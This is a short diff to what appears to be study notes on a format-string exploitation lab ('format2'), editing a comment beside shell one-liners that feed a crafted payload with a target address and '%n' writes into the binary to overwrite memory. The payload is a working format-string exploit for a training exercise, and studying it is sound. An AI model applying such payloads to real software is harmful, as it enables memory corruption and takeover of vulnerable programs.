@@ -454,7 +454,7 @@ objdump -M intel -d ./format2 | awk -F"\n" -v RS="\n\n" '$1 ~ /vuln/'
   # %5$: `%n$` a form of conversion specifications. The nth argument on the stack.
   # careful do not trigger bash substitution "$x"
 ./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%6$16d%5$x')
-  # add padding on the printing format of %6$<len><type>
+  # print the 6th argument with desiable length of padding, before writing the &target. %6$<len><type>
 ./format2 <<< $(echo -en "AAAA\xe4\x96\x04\x08BBBB";echo -en '%6$52x%5$n')
 ```
 
